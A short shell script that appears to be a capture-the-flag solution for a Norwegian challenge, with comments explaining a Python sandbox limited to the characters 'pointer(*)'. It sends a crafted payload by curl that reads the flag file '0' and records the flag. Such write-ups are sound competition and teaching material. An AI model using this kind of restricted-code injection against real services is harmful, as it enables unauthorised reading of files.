#!/bin/sh

URL=https://helsectf2024-2da207d37b091b1b4dff-null-pointer.chals.io

# For å hindre misbruk er kun 10 forskjellige tegn tillatt i python-programmet:
# pointer(*)
#
# Dessverre viser det seg at dette ikke er godt nok.
# Hent ut flagget i fila 0 i current directory.

program='print(*open(repr(int())))'

curl "$URL/?program=${program}"

# helsectf{z3r0_p0inters_g1ven}
